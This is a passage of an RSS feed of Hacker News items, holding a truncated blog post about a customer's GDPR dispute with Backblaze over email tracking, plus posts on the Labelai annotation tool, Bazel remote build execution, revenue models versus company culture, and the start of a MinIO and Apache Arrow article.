<figure><div>Jun 23, 2020<p>Hello Yoav,</p><p>I asked my Compliance organization to review your concerns. They noted that much of the literature around this topic deals with Marketing Emails, which you can opt-out of at any time.&nbsp;&nbsp;</p><p>For Service Emails, which the message in question is, the rules are less clear and they will contact our GDPR attorney in the EU for clarification. That said, I believe you have four choices:<br>1) You may alter the settings on your email system to receive such emails as text, this will remove all tracking,<br>2) You can discontinue using the Backblaze service and delete your Backblaze account if you remain an active customer we will continue to send you Service emails per our Terms,<br>3) You can wait to see what our GDPR attorney says, or<br>4) You may file a complaint with the GDPR authorities in your jurisdiction.</p><p>All the best,<br>A.<br>Support Technician</p></div></figure>



<figure><div>Jun 23, 2020<p>Hi A.,</p><p>Happy to wait and hear from your GDPR attorneys.</p><p>I agree that most resources talk about marketing emails, because those are the most prevalent and most common use-case of B2C and B2B emails these days. Transactional emails are generally considered legitimate use, and in this case, I explicitly asked for those emails. So there’s no question there about *sending* these emails. As far as *tracking* how I interacted with the email, as well as further personal data like IP address, device/browser info etc (that this type of tracking typically involves), and storing this info on Sendgrid’s servers, I’m pretty confident that this isn’t considered legitimate without informed and explicit consent under the GDPR and the ePrivacy directives. hey.com seem also quite confident that this is illegal (although I don’t take legal advice from them).</p><p>But besides that, I’m just curious to understand why Backblaze even cares to track those emails? what insights do you gain from knowing that X% of those emails were opened? (especially given that those stats are hugely inaccurate and some email clients block them anyway?). Wouldn’t it be easier to do the right thing here, respect your customers privacy, and stop tracking those emails? (or if you do gain important insights, explicitly and clearly ask for consent?)</p><p>Sincerely,<br>Yoav</p><p>p.s. I also believe the same rules apply to tracking of marketing emails, even if someone explicitly gives consent to *receive* those, it does not automatically mean that they give consent to being tracked, and the privacy implications of such tracking.</p></div></figure>



<figure><div>Jun 24, 2020<p>Hello,&nbsp;</p><p>I have referred the matter to the legal department and will need to close this ticket. Any further communication will come from <a href="mailto:legal@backblaze.com" rel="noreferrer noopener" target="_blank">legal@backblaze.com</a>.</p><p>All the best,<br>A.<br>Support Technician</p></div></figure>



<h2>A month passes…</h2>



<p>I was losing my patience, so sent another message to Backblaze.</p>



<figure><div>Jul 25, 2020<p>This is a follow-up to your previous request #ZZZZZZZ “email tracking”</p><p>Hi A.,It’s been a month now, and I still haven’t heard back. Would appreciate if someone can get back to me on this.</p><p>Sincerely,<br>Yoav</p></div></figure>



<div><div>
<figure><div>Jul 25, 2020<p>Hi Yoav,</p><p>Thank you for reaching out regarding this issue. Apologies for any delay. I’m sorry to say but further communication will need to go through <a href="mailto:legal@backblaze.com" rel="noreferrer noopener" target="_blank">legal@backblaze.com</a>.</p><p>Please reach out to that email for additional information.<br>M.<br>Support Technician</p></div></figure>



<figure><div>Jul 26, 2020<p>Hi M.,</p><p>Yes, but it’s been a month, and I believe that under GDPR I can typically expect an answer within a month? see https://ico.org.uk/your-data-matters/time-limits-for-responding-to-data-protection-rights-requests/</p><p>Looking forward to hearing back from whichever team/person that can handle my enquiry.</p><p>Sincerely,<br>Yoav</p></div></figure>



<h2>Legal department steps in</h2>



<figure><div>Jul 31, 2020<p>Hi Yoav,</p><p>Thank you for following up on this matter. We take data privacy matters very seriously at Backblaze, Inc. We have reviewed your concerns and understand your sensitivity regarding the use of tracking technology on emails. In this particular case, we believe there is an exception allowed for doing so for a valid business purpose. There are two reasons we believe this is necessary.</p><p>The first reason is to accurately measure the reach and usefulness of our service email messages to our customers. Service emails communicate important information to the customer and if they are not being received or opened, valuable information is being missed. For example, the customer’s data we are storing could be at risk of being deleted, or their account could be in peril of being compromised. We use the tracking technology to provide an aggregated measure of this information versus using more invasive technologies such as user surveys or onscreen popups. Over the years we have sent many service emails and we have a full understanding as to the delivery and open rates of our service emails. As such, any anomalies are easily detected and can be acted upon to improve how well we communicate with our customers.</p><p>The second reason is for forensic purposes to respond to questions from customers and defend ourselves as needed. For example, we send multiple service emails to a customer whose subscription is expiring, as once it does expire, we will close their account and delete the data we are storing for them. From time-to-time an ex-customer will want their data and claim we did not notify them that their account was expiring. The tracking technology allows us to show what messages we have sent and what messages the customer received and opened. While not perfect, it has helped us defend ourselves in the past. There is no reasonable replacement for using the tracking technology in such cases. By the way, the same technology also allows us to prove the customer right in many cases, so it delivers value and protects both us and the customer at the same time.</p><p>Thank you for being a valued customer.</p><p>Best regards,<br>T.<br>Legal Department</p></div></figure>



<figure><div>Aug 1, 2020<p>Hi T.,</p><p>Thanks for getting back to me and explaining your reasoning in detail.</p><p>I have to admit, it sounds a bit like a husband spying on their wife “because they love her” to some extent. I don’t feel like these are valid reasons for blanket tracking of ALL emails across all customers, which seems to be the case at Backblaze. As far as I can tell, all Backblaze emails are tracking me and all other customers, from newsletters, across minor service notifications all the way to billing and other messages. Not all messages are the same, but they are all tracked in the same way as far as I can tell. Furthermore, not only there is no informed consent for this tracking, there’s actually no opt-out mechanism either. As a customer, I cannot tell you that I want your service emails, but I don’t want them tracking me. I don’t believe this meets the spirit nor the letter of the GDPR.</p><p>The first example does not at all sound like a legitimate reason to me, and I doubt the data protection authorities will accept it as legitimate either. Especially when it applies to all emails, including minor notifications, newsletters and other marketing materials. What you’re describing is that you’re compromising the privacy of your customers for your own internal reasons for marketing purposes. And as I mentioned before, with no informed consent, nor opt-out options. But besides that, given …</p></div></figure></div></div></div></article></main></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.gingerlime.com/2020/why-is-backblaze-tracking-me/">https://blog.gingerlime.com/2020/why-is-backblaze-tracking-me/</a></em></p>]]>
            </description>
            <link>https://blog.gingerlime.com/2020/why-is-backblaze-tracking-me/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534572</guid>
            <pubDate>Sun, 20 Sep 2020 15:32:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Labelai – speed up training your AI models with a free open-source app]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24534538">thread link</a>) | @aralroca
<br/>
September 20, 2020 | https://aralroca.com/blog/labelai | <a href="https://web.archive.org/web/*/https://aralroca.com/blog/labelai">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I'd like to tell you why I made <strong><a href="https://github.com/aralroca/labelai">Labelai</a></strong>, a tool that makes it easier to train image recognition AI models (ImageNet, YOLO and its variants) from any device ensuring security.</p>
<h2 id="a-little-bit-of-context">A little bit of context</h2>
<p>When we want to directly use existing image recognition models such as ImageNet, COCO-ssd or YOLO, we are limited to predict only everyday objects such as cars, people, etc. This is because these models have only learned to recognize these objects within an image. However, there are techniques such as transfer-learning that allow us to retrain these models to <strong>predict what we want</strong>. </p>
<p>In order to retrain these models, we have to <strong>manually label each object</strong> that we want to recognize by writing the coordinates of the object in a text file for each image to train. This way the model will be able to learn how to recognize them. This labeling process can be very boring and tedious.</p>
<p>Currently, there are not many alternative tools for this labeling process. The best known current tool is <a href="https://github.com/tzutalin/labelImg">labelImg</a>. The tool is good and does its job, although it has some root problems:</p>
<ul>
<li><strong>Not available in all devices</strong>. It can only be downloaded as a desktop application.</li>
<li><strong>Requires installation</strong>. It requires installation and it isn't very beginner-friendly. Depending on your OS and Python version the dependencies will be different. For example on Mac with Python 3+, you need to install first some dependencies like <code>qt</code> and <code>libxml2</code> with Homebrew, and <code>pyqt5</code> and <code>lxml</code> with pip.</li>
<li><strong>Security</strong>. The application manipulates the files on your system. In theory, it only manipulates files related to annotations. I say "in theory", because we hope there won't be a bug in the future touching what it shouldn't... </li>
<li><strong>Updates are not automatic</strong>. Related to the previous point, many updates are made for security reasons, especially if it has dependencies. The fact that updates are not done automatically makes it your responsibility to keep your application up to date.</li>
</ul>
<h2 id="launching-labelai">Launching Labelai</h2>
<p>Using labelImg during the last months, I realized that a <strong>web application</strong> inspired by it would solve several of these problems:</p>
<ul>
<li><strong>Available in all devices</strong>. Being a web application makes it accessible from any device, even tablets, and mobiles.</li>
<li><strong>No installation required</strong>. It speeds up the start, as it does not require installation and has no dependencies on your operating system. Only the browser.</li>
<li><strong>Automatic updates</strong>. You will always have the latest version available.</li>
<li><strong>Security</strong>. No file on your system is directly manipulated. Files are imported/saved using the security layer of your browser.</li>
<li><strong>Beginner-friendly</strong>. We want it to be an easy-to-use process without losing flexibility. To start, you only need to open a browser with any device.</li>
</ul>
<p>So during my August holiday, I took the opportunity to implement the first POC of my idea. And today, I announce that its <strong>first version is out</strong>.</p>
<a href="https://github.com/aralroca/labelai">
  <figure>
    <img loading="lazy" src="https://aralroca.com/images/blog-images/labelai.png" alt="Labelai logo">
    <figcaption><small>Labelai</small></figcaption>
  </figure>
</a>

<p>This version 1.0.0 is focused on being useful as a web tool to label your images and supports both <strong>ImageNet</strong> and <strong>YOLO</strong>, and its variants.</p>
<p>In addition, I tried to improve the user experience when labeling by making it less necessary to press so many buttons.</p>
<p>Currently, I have some future ideas to expand the features so that it does not remain only as an annotation tool, but to train models after labeling the images.</p>
<figure>
  <img loading="lazy" src="https://aralroca.com/images/blog-images/demo.gif" alt="Labelai demo">
  <figcaption><small>Labelai demo</small></figcaption>
</figure>


<h2 id="future-features">Future features</h2>
<p>As a free open-source tool we want to evolve according to the contributions of the community. However, in the first version, there are some things that have not yet been implemented and the idea is to implement them for the next version:</p>
<ul>
<li><strong>Improve tablet / mobile experience</strong>. Now the support is minimal, it works, but not as well as some users would like. For example, it is not very responsive. This should be improved in a next version.</li>
<li>Possibility to <strong>train directly</strong> your labeled images <strong>with the same app</strong> and also to save the generated model.</li>
<li><strong>Offline</strong> support. Now it only works online, but one of the improvements would be to support it offline as PWA.</li>
</ul>
<p>Any further improvements you would like to make? Please let me know in the comments.</p>
<h2 id="try-it">Try it</h2>
<p>I encourage you to try the app and contribute to GitHub to evolve this tool according to the community.</p>
<ul>
<li>App: <a href="https://labelai.vercel.app/">https://labelai.vercel.app/</a></li>
<li>GitHub: <a href="https://github.com/aralroca/labelai">https://github.com/aralroca/labelai</a></li>
</ul>
<p>To help me boost this project, please, let me know that you like it by <strong>starring on GitHub</strong>.</p>
</div></div>]]>
            </description>
            <link>https://aralroca.com/blog/labelai</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534538</guid>
            <pubDate>Sun, 20 Sep 2020 15:25:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overview of Remote Build Execution]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534447">thread link</a>) | @kousikk
<br/>
September 20, 2020 | https://kousiktn.github.io/posts/2020-09-20-remote-build-execution/ | <a href="https://web.archive.org/web/*/https://kousiktn.github.io/posts/2020-09-20-remote-build-execution/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
    <article>
      <header>
        
        <div>
          <p><span>
              <i></i>
              <time datetime="2020-09-20T00:00:00Z">
                September 20, 2020
              </time>
            </span>
            <span>
              <i></i>
              5-minute read
            </span>
          </p>
          
          
        </div>
      </header>

      <div>
        
        
<p>One of the big benefits of using build systems like Bazel is that it supports remote-execution and caching of the build out of the box. Each action in the build graph can be executed on a remote machine, cached and then downloaded onto the local machine. When there are multiple developers on the team (or you are re-building your project from scratch on a different machine), and if the build has already been run by a developer in the team, then the other developers can simply reuse the results of the previous build thereby reducing the build time and load on the their local machines.</p>
<h2 id="how-is-a-remotely-executed-build-faster">How is a remotely executed build faster?</h2>
<p>Faster end-to-end build time is achieved in two ways:</p>
<ol>
<li><em><strong>High Parallelism</strong></em></li>
</ol>
<p>In a locally executed build, the build parallelism is usually capped to the number of CPU cores / RAM available on the machine (for example <code>-j 16</code> of <code>-j 96</code> if you are on one of those more expensive machines). With a remotely executed build you can far exceed the local parallelism and can go upto <code>-j 500</code> or even <code>-j 1000</code> depending on how good and light-weight the client implementation is. If portions of the build graph are wider than the <code>-j</code> value of the local machine, then those portions will heavily benefit by high parallelism.</p>
<ol start="2">
<li><em><strong>Cached Action Results</strong></em></li>
</ol>
<p>While remote-execution of an individual action is generally expected to be slower than a locally executed action (remote-execution has overhead like shipping local input files to remote server, running the action on remote-server and downloading remotely executed results), fetching the cached result of a previously remotely executed action is usually faster than locally executing a build action. In a large organization (like Google :D) or a large repository, <a href="http://google-engtools.blogspot.com/2011/09/build-in-cloud-distributing-build-steps.html"><code>&gt; 90%</code></a> of the overall actions generally result in cache-hits. The larger the number of repetitive builds you do, the higher your cache-hit rate will be.</p>
<h2 id="remote-execution-api">Remote Execution API</h2>
<h3 id="action-specification">Action Specification</h3>
<p>Build systems like Bazel use the open source <a href="https://github.com/bazelbuild/remote-apis">Remote Execution API</a> with a corresponding gRPC server that implements a remote-execution API. The remote-execution API describes a mechanism for executing an arbitrary local command remotely. In order to execute a command on a remote machine you would need the following basic things:</p>
<ol>
<li>The command line invocation</li>
<li>Input files / directories</li>
<li>Environment variables</li>
<li>Output files / directories</li>
<li>Platform configuration (like Mac / Linux / Windows)</li>
</ol>
<p>For example, lets say you want to run a compilation action like the following on a remote Linux machine</p>
<div><pre><code data-lang="fallback">PWD=/proc/self/cwd clang++ -c test.cpp -o test.o
</code></pre></div><p>Here’s what the various requirements mentioned above would map to:</p>
<ol>
<li>The command line invocation = <code>clang++ -c test.cpp -o test.o</code>.</li>
<li>Input files / directories
This would include the following files:</li>
</ol>
<div><pre><code data-lang="fallback">1. test.cpp
2. test.h
3. ... other header files included by test.h / test.cpp transitively ...
</code></pre></div><ol start="3">
<li>Environment variables = <code>PWD=/proc/self/cwd</code></li>
<li>Output files / directories = <code>test.o</code></li>
<li>Platform configuration = <code>OS=Linux, toolchain=clang-10</code>
Note that the platform configuration you specify depends on what platform configurations the remote-execution server respects. In the example above, the remote-execution server would have to know to make <code>clang-10</code> binaries available during command execution and must execute the command on a Linux machine. As you can imagine, more fancier platform specifications are possible.</li>
</ol>
<p>An encapsulation of the various things described above is what we call an <a href="https://github.com/bazelbuild/remote-apis/blob/master/build/bazel/remote/execution/v2/remote_execution.proto#L388"><code>Action</code></a>. An <code>Action</code> captures the various information needed to run the command on a remote server.</p>
<h3 id="content-addressable-storage">Content Addressable Storage</h3>
<p>We looked at what goes into an action but haven’t described how the action is presented to the remote-execution server by the client. In the remote-execution API specification, content-addressable storage (CAS) is used to present the action and also the dependencies specified by the action. The CAS is a common key-value store that both the remote-execution client and remote-execution server utilize for exchanging data.
The general series of steps in presenting an a piece of data (an action spec / an input file etc) to a remote-execution server using content-addressable storage is:</p>
<ol>
<li>
<p>Compute the digest of the what you want to store.</p>
<p>a. In the case of a regular file, it will be a digest of the file.</p>
<p>b. In the case of a directory, it will be a digest of the Merkle tree root of the directory.</p>
<p>c. In the case of an action specification, it will be a digest of the wire format of the action spec.</p>
</li>
<li>
<p>Store the digest along with the data in CAS. The digest will be the key and the data itself will be the value.</p>
</li>
<li>
<p>Present the digest to the remote-execution server which can in-turn utilize the CAS service to fetch the data.</p>
</li>
</ol>
<h3 id="steps-involved-in-running-an-action">Steps involved in running an action</h3>
<p>At this point we have all the basic building blocks we need to see how we can run an action remotely. Lets take a sample C++ compile command we saw above, add more details to it and see how it can be remotely executed with the remote-execution API.</p>
<p>test.cpp:</p>
<div><pre><code data-lang="fallback">#include "test.h"
int main() {
    std::cout &lt;&lt; "Hello world!\n";
    return 0;
}
</code></pre></div><p>test.h</p>
<div><pre><code data-lang="fallback">#ifndef TEST_H
#define TEST_H

#include &lt;iostream&gt;

#endif
</code></pre></div><ol>
<li>Determine the inputs of above action. In Bazel, the dependent header files are described in <code>BUILD</code> file. In scenarios where that is not the case, the test.cpp file will be preprocessed to find out the dependent header files.</li>
<li>Upload each of the header files along to CAS keyed with their digest.</li>
<li>Determine the output to be produced by the action. In this case, the output is going to be <code>test.o</code> file.</li>
<li>Determine the toolchain to be used for this compilation. Lets assume that we are going to use <code>clang-10</code> and assume that the remote-execution server will make it available when remotely running the action.</li>
<li>Construct the action spec. It would look something like (in textproto):</li>
</ol>
<div><pre><code data-lang="fallback">input_root_digest: &lt;input-dir-digest&gt;
output_files: "test.o"
platform: {
    key: "toolchain"
    value: "clang-10"
}
platform: {
    key: "OS"
    value: "Linux"
}
</code></pre></div><ol start="6">
<li>Serialize the action spec to binary format and compute the digest of the serialized action spec.</li>
<li>Upload the action spec to CAS keyed by its digest.</li>
<li>Call <a href="https://github.com/bazelbuild/remote-apis/blob/master/build/bazel/remote/execution/v2/remote_execution.proto#L107">Execute()</a> RPC on the remote-execution server.</li>
<li>Download the output file from the CAS using the digest present in the result of the <code>Execute()</code> call.</li>
</ol>

      </div>


      
    </article>

    
  
  
  
  </section>

      </div></div>]]>
            </description>
            <link>https://kousiktn.github.io/posts/2020-09-20-remote-build-execution/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534447</guid>
            <pubDate>Sun, 20 Sep 2020 15:05:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Revenue Model, Not Culture, Is the Dominant Term]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534307">thread link</a>) | @Ozzie_osman
<br/>
September 20, 2020 | https://somehowmanage.com/2020/09/20/revenue-model-not-culture-is-the-dominant-term/ | <a href="https://web.archive.org/web/*/https://somehowmanage.com/2020/09/20/revenue-model-not-culture-is-the-dominant-term/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-101">

	

	
	<div>
		
<p>I always loved getting problems of the type “What is the limit as x approaches infinity” type in high-school/college. You’re given an equation (of the classic y=x format), and asked to derive what the value of y will be as x grows to infinity.</p>



<p>One thing you learn pretty quickly about these types of problems is that often it doesn’t matter where the function “starts” (or where it is at small values of x). It could start at zero, or at negative infinity, but its limit might be infinity, and vice versa (it could start large but have a limit of zero or negative infinity).</p>



<p>In fact, for many equations, there’s usually one <strong>dominant term</strong>. This is the term that dominates the limit. There might be countless other factors or parts of the equation that matter initially, but eventually it’s that dominant term that wins. This is sometimes known as the <strong>dominant term rule</strong>. We’ll get back to this in a second.</p>



<h3>Ads vs. Search</h3>



<p>Google had a little press kerfuffle a few months ago. You can read a summary in the New York Times <a href="https://www.nytimes.com/2020/01/31/technology/google-search-results.html">here</a>, but the short of it is that the company launched a design change that made search results and ads look very similar. Presumably, this increased revenue for Google, since many people ignore ads when they can easily identify them, the same way you’d ignore stepping in dog crap if you can identify it in the mud (and yes, given the state of online ads and content I pick this analogy deliberately). But there was a pretty strong backlash against this as a “dark pattern” designed to trick users. After the negative press, Google walked back the change.</p>



<p>If you’ve been following the news around big tech companies these past couple of years, this type of behavior is not surprising at all. These companies have grown really large, are arguably monopolistic, and hyper-focused on growth and revenue. Over and over, they have made decisions that have resulted in backlash from the press and from their users.</p>



<p>On the other hand, if I ignore the past ten years, and jump back to when I worked at Google as an entry-level Software Engineer, it is a <em>little</em> surprising to me. I worked at Google from 2006-2009. At the time, it was already a rapidly-growing public company (I think I joined when there were around 8,000 employees, and left when there were 20,000). I initially worked on the team responsible for AdWords, so I had some exposure to the culture and decisions that were made at the time (of course it wasn’t <em>deep</em> exposure, since I was an entry-level Software Engineer on the lowest rung of the ladder… but it was exposure nonetheless).</p>



<p><em>Note: I’m going to pick on Google a little bit here, but I do love that company. I think there’s a lot it can improve on, but it’s still one of my favorite and least “evil” large tech company. I chose them simply because I’m more familiar with them.</em></p>



<p>At the time, Google employees might have argued against making a change because it was “evil”. The “don’t be evil” motto was still around, and as engineers who were building parts of the product and making decisions, we were pretty ideological about it. One of the company’s values was also to put users first, employees second, and shareholders third. By any of these lenses, the type of design change that Google got flak for recently would have been highly unlikely at the time.</p>



<h3>Revenue is the Dominant Term</h3>



<p>Let’s take a dominant term view of this problem. When a company is first built, several variables dictate its decisions:</p>



<ul><li>The <em>implicit </em>values/culture of the early team. As Ben Horowitz would say, “what you do is who you are.”&nbsp;</li><li>The <em>explicit </em>values/culture of the early team. Are we user-centric? Data-driven? …</li><li>The revenue model.</li></ul>



<p>I think that over time, the revenue model is the dominant term. The limit of a product towards infinity, so to speak, is based on its revenue model. If your revenue model is ads, it doesn’t matter if your stated mission is “to organize the world’s knowledge and make it universally accessible and useful”, “to give people the power to build community and bring the world closer together”, or anything else. If your revenue model is ads, you are an ads company.</p>



<p>I’m not diminishing the role of culture and values. I think those are critical. Part of me would love to believe the hundreds of books written on how culture determines everything. But I don’t. At least not for companies that can hire some of the smartest people in the world, gather massive amounts of data, and build technology more sophisticated than ever. And be trying to “maximize shareholder value”.</p>



<p>I’ve actually agonized over whether culture or revenue are the dominant term. In fact, I agonized so much that I’ve had this article in my head for years, and in a Google Doc for months, but I couldn’t get myself to write it / publish it. Because part of me believes culture always wins. Actually, <em>all</em> of me <em>wants </em>to believe culture <em>always</em> wins. But I’ve had my idealism crushed enough times by hard realities.&nbsp;</p>



<p>Yes, having and espousing a positive culture and set of values are important. And they may shape how and how quickly the revenue model dominates (for example, companies like Enron or pre-IPO Uber show how bad things can get if you have a terrible culture). But regardless of your mission statement, your culture, your values, and so on, if you choose the wrong revenue model, it will dominate them in a shareholder-value-driven, capitalistic society. Culture can only dominate if it’s negative. A positive culture <em>is </em>necessary, but it’s not sufficient.</p>



<p><em>In other words, over the long term, a company (and its product) will morph to take the shape of its revenue streams.</em></p>



<h3>Charlie Munger Knew It</h3>



<p>Charlie Munger, Warren Buffet’s business partner, has a pretty famous speech where he talks about the power of incentives.</p>



<blockquote><p>“Well I think I’ve been in the top 5% of my age cohort all my life in understanding the power of incentives, and all my life I’ve underestimated it. And never a year passes, but I get some surprise that pushes my limit a little farther.” —<a href="https://fs.blog/2013/02/the-psychology-of-human-misjudgement/">Charlie Munger</a></p></blockquote>



<p>Charlie gives several examples: for instance, FedEx needed to move/sort their packages more quickly, so instead of paying employees per hour, they paid them per shift: productivity increased dramatically (employees now had less incentive to take longer hours to do the same amount of work). Charlie’s model of human behavior is pretty simple: we follow incentives. He makes people sound almost coin-operated.</p>



<p>Now, this isn’t entirely true—there are plenty of examples and research showing that our behavior is more complicated than simple incentives would predict. But Charlie is arguably one of the best investors in the world, and he’s onto something. Even though there might be other variables that influence our behavior, you can still simplify things down to incentives. Incentives are his dominant term.</p>



<p>That incentives are dominant is actually pretty obvious to a lot of people. Somehow in the tech industry, we seem to have just clouded our own judgement through some sense of moral superiority. We care about the impact we’re having on the world. We have noble missions that we rally around and try to hire people who are excited by them. So far, so good. But then we shoot ourselves in the foot by setting up business models with misaligned incentives.</p>



<h3>Look for Aligned Business Models</h3>



<p>So what does this mean in practice? Well, if you only care about making money, it doesn’t mean much. But if you do care about more than money, if you care about the impact your work has and you want to be proud of what you do, it’s worth thinking through this a little more deeply.</p>



<p>Whether you’re starting a company or joining one, look for a business model <em>without</em> perverse incentives. A business model that sets things up so that the better a product is, the better off the company is and its users are.</p>



<p>Sometimes, counterintuitively, a business model may seem aligned at first glance, but end up being quite harmful. The classic example that we’re all now aware of is free products. Free seems great at first glance. But companies have to make money somehow. So they sell ads, or data, or some mix of the two that their users don’t quite understand. And so now, success for the company means more time spent on the product (which may or may not be a good thing for users), less privacy (definitely not a good thing for users), and ultimately more ads.*</p>



<p>So often, paid is better than free*.  At <a href="https://www.monarchmoney.com/">Monarch Money</a>, my current startup, we’ve chosen to go with a paid model, with a hope that we’ll be more aligned in creating value for our users (who we can now call customers… notice how there’s a word for “customer service”, but no “user service”?). There will still be plenty of forks in the road where we can decide whether we help our customers, or take advantage of them, and I hope our values will help us navigate those forks, but at least the revenue model is in our favor.</p>



<p>Another layer to consider is whether your product and revenue model help people with just short-term goals, or a mix of both short and long-term goals. Products that are great and helpful, help their users with both. Good products might help with one or the other. The products with the most potential for damage provide some short-term benefit at the <em>expense</em> of longer-term goals.</p>



<p>So when you consider starting or joining a company, look at the business model, and do the “limit math”. Think about what things might look like if you become massively successful, because you might be.</p>



<hr>



<p><em>*This is an opinion piece. I had to draw a lot of simplifications to keep this article short. A lot of statements are definitely not universally true, but are true enough that they’re worth using as examples.</em></p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://somehowmanage.com/2020/09/20/revenue-model-not-culture-is-the-dominant-term/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534307</guid>
            <pubDate>Sun, 20 Sep 2020 14:39:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apache Arrow and MinIO]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 45 (<a href="https://news.ycombinator.com/item?id=24534274">thread link</a>) | @jtsymonds
<br/>
September 20, 2020 | https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/ | <a href="https://web.archive.org/web/*/https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>More and more enterprises have begun or have already implemented a data lake strategy based on some of the work we did a couple of years ago. If you want to take a moment to review - you can find those posts below <a href="https://blog.min.io/modern-data-lake-with-minio-part-1/">here</a> and <a href="https://blog.min.io/modern-data-lake-with-minio-part-2/">here</a>. </p><h2 id="objective">Objective</h2><p>In this article, I am going to explain a mechanism to turbocharge the use of MinIO. Nothing changes as far as MinIO is concerned, the optimization will be on the underlying storage of our data. We are going to choose one of the latest formats to improve agility manifoldly. We are going to show the ways by which your data lake data can travel across systems without experiencing any "conversion" time. </p><h2 id="apache-arrow">Apache Arrow</h2><p>I believe understanding this article needs some basic concepts of<a href="https://arrow.apache.org/"> </a>how applications like Spark works. Let me explain it in simple terms.</p><p>Imagine you got a nice job at a location different from where you live currently and you want to relocate, as the new company demands it and pays for it. You have got the most modern televisions, refrigerators, super soft leather sofas, bed and so on. You engage a moving company, who comes, disassembles everything, packs it conveniently. They also make sure to pack as much possible in containers to fill the truck such that they can do it in a single trip. Once they reach the destination, they unpack, assembles and restore everything as it was.</p><p>The same applies to data. When I store some data in MinIO , and I need to feed it to, say, another application, say Spark, the consuming application needs to disassemble the data from MinIO data lake, pack it and transport it through the wire (or wireless), receive, unpack and re-assemble. </p><p>Let's use more technical terms for this disassembly and assembly - serialization and de-serialization of data. The unfortunate part is, both these processes are complex and time consuming. Here is a brief diagram illustrating what happens in Apache Spark when it reads data</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1944w" sizes="(min-width: 720px) 720px"><figcaption>Experimental setup. Courtesy: <a href="https://databricks.com/session/running-apache-spark-on-a-high-performance-cluster-using-rdma-and-nvme-flash">Spark Summit</a></figcaption></figure><p>You may not have noticed this problem before. Assume that MinIO is on a machine(s) on the network. We write a Spark Map-Reduce application. Eventhough the network limit is 100 GbE, we are almost getting less that 10 GbE speed. What's the use of this high speed network then? What is the potential problem which is not allowing us to utilize the full potential of the network, or at least 70-80% of it?</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1948w" sizes="(min-width: 720px) 720px"><figcaption>Additional layers, buffers and serializers</figcaption></figure><p>The issues are with the way in which Spark is retrieving the data. Look at the number of layers the data has to pass though. This creates a limit on the throughput that we can achieve. There are projects like <a href="https://crail.apache.org/">Apache Crail,</a> which are designed to address these issues.</p><h2 id="optimization-columnar-data-format">Optimization : Columnar Data Format </h2><div><p>If we think about the relocation example mentioned above, we see that the logistic company will never take the sofa as it is, they will break it down to make it easy to transport. Note that this is for transportation purposes only - if that objective is different, then disassembling the sofa might not be the right approach. </p><p>Given that the objective for a data lake is analytics - rather than transactional needs we must take that under consideration. For transactions, we often use OLTP systems like Oracle or PostGres - given that they are particularly well suited for the job. A quick review of OLAP's analytics requirements is probably in order. </p></div><figure><img src="https://blog.min.io/content/images/2020/09/Picture1.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Picture1.png 600w, https://blog.min.io/content/images/2020/09/Picture1.png 966w" sizes="(min-width: 720px) 720px"><figcaption>Introducing columnar format</figcaption></figure><p>Let's start with one of the most famous RDMBS table - the "emp" table of Oracle. The top part shows how the data is stored in RDBMS as a "relation" or "tuple". We call it a table. I am providing you two queries</p><!--kg-card-begin: markdown--><ol>
<li>select ename from emp where job = 'CLERK'</li>
<li>select sum(sal) from emp</li>
</ol>
